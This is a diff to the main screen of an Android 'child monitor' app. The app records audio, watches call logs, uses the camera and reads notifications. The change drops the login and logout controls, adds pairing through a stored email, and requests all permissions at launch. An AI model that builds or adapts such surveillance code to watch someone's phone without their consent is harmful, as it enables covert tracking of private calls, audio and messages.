@@ -2,6 +2,7 @@ package com.monitor.child;
 
 import android.Manifest;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
@@ -15,8 +16,6 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import com.google.firebase.auth.FirebaseAuth;
-import com.monitor.child.auth.LoginActivity;
 import com.monitor.child.manager.FirebaseManager;
 import com.monitor.child.service.AudioRecordService;
 import com.monitor.child.service.CallLogMonitor;
@@ -31,7 +30,7 @@ public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 1001;
 
     private FirebaseManager firebaseManager;
-    private Button btnStartMonitor, btnStopMonitor, btnSwitchCamera, btnLogout;
+    private Button btnStartMonitor, btnStopMonitor, btnSwitchCamera;
     private Button btnEnableNotifAccess;
     private TextView tvStatus, tvCameraMode, tvEmail;
 
@@ -57,16 +56,21 @@ public class MainActivity extends AppCompatActivity {
 
         firebaseManager = FirebaseManager.getInstance();
 
+        SharedPreferences prefs = getSharedPreferences("child_prefs", MODE_PRIVATE);
+        String pairedEmail = prefs.getString(Constants.PREF_PAIRED_EMAIL, null);
+        if (pairedEmail != null) {
+            firebaseManager.setCurrentEmail(pairedEmail);
+        }
+
         btnStartMonitor = findViewById(R.id.btn_start_monitor);
         btnStopMonitor = findViewById(R.id.btn_stop_monitor);
         btnSwitchCamera = findViewById(R.id.btn_switch_camera);
-        btnLogout = findViewById(R.id.btn_logout);
         btnEnableNotifAccess = findViewById(R.id.btn_enable_notif_access);
         tvStatus = findViewById(R.id.tv_status);
         tvCameraMode = findViewById(R.id.tv_camera_mode);
         tvEmail = findViewById(R.id.tv_email);
 
-        tvEmail.setText("Logged in as: " + firebaseManager.getCurrentEmail());
+        tvEmail.setText("Paired as: " + firebaseManager.getCurrentEmail());
         tvCameraMode.setText("Camera: " + Constants.CAMERA_FRONT);
         tvStatus.setText("Status: Stopped");
 
@@ -89,11 +93,12 @@ public class MainActivity extends AppCompatActivity {
         btnStartMonitor.setOnClickListener(v -> checkPermissionsAndStart());
         btnStopMonitor.setOnClickListener(v -> stopAllServices());
         btnSwitchCamera.setOnClickListener(v -> toggleCamera());
-        btnLogout.setOnClickListener(v -> logout());
         btnEnableNotifAccess.setOnClickListener(v -> openNotifAccessSettings());
+
+        requestAllPermissions();
     }
 
-    private void checkPermissionsAndStart() {
+    private void requestAllPermissions() {
         List<String> missing = new ArrayList<>();
         for (String perm : REQUIRED_PERMISSIONS) {
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
@@ -101,9 +106,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        if (missing.isEmpty()) {
-            startAllServices();
-        } else {
+        if (!missing.isEmpty()) {
             ActivityCompat.requestPermissions(this,
                     missing.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         }
@@ -121,10 +124,8 @@ public class MainActivity extends AppCompatActivity {
                     break;
                 }
             }
-            if (allGranted) {
-                startAllServices();
-            } else {
-                Toast.makeText(this, "All permissions are required for monitoring",
+            if (!allGranted) {
+                Toast.makeText(this, "All permissions must be granted for full functionality",
                         Toast.LENGTH_LONG).show();
             }
         }
@@ -175,16 +176,9 @@ public class MainActivity extends AppCompatActivity {
         return enabledListeners != null && enabledListeners.contains(getPackageName());
     }
 
-    private void logout() {
-        stopAllServices();
-        firebaseManager.cleanup();
-        FirebaseAuth.getInstance().signOut();
-        startActivity(new Intent(this, LoginActivity.class));
-        finish();
-    }
-
     @Override
     protected void onDestroy() {
         super.onDestroy();
     }
 }
+
